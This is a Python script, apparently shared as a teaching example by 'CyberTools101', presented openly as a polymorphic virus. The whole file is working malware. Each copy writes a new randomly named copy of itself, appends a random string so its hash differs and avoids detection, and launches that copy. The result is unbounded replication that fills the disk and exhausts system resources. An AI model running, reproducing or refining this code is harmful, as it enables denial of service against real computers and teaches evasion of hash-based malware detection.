#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Created on Wed Jun 28 22:16:15 2023
Purpose: This is just a generic example of a polymorphic virus. When ran, it creates a copy of itself
         along wtih a random string to generate a new hash making it harder to be discovered. This virus
         main purpose is to consume system resources and slow down the computer. 
         
Warning: THIS WILL FILL YOUR COMPUTER WITH PYTHON FILES AND CONSUME RESOURCES INTO A SCREECHING HALT!
@author: CyberTools101
"""

import os
from threading import Thread
import sys
import random
import string

#get the current file
thisfile = os.path.basename(__file__)

#open up the file and read it
f = open(thisfile, "r")
lines = f.readlines()

#Create the new file and include a different name
filename = "newpython{randomness}.py".format(randomness="".join(random.choices(string.ascii_lowercase + string.digits, k=5)))

#start copying the contents of the files to the new one
g = open(filename, "w")

count = len(lines)
start = 0
for line in lines:
    start = start + 1
    #we dont want to copy the random string added to the end
    if start == (count - 1):
        break
    g.write(line)

#add the string at the end to change hash files and prevent discovery
g.write('\n#{chaos}'.format(chaos="".join(random.choices(string.ascii_lowercase + string.digits, k=5))))

#always closing everything
g.close()
f.close()

#run the newly created file
def runFunc():
    os.system('python3 ' + filename)

thread = Thread(target=runFunc)
thread.start()

#Ensure this thread gets closed
sys.exit()
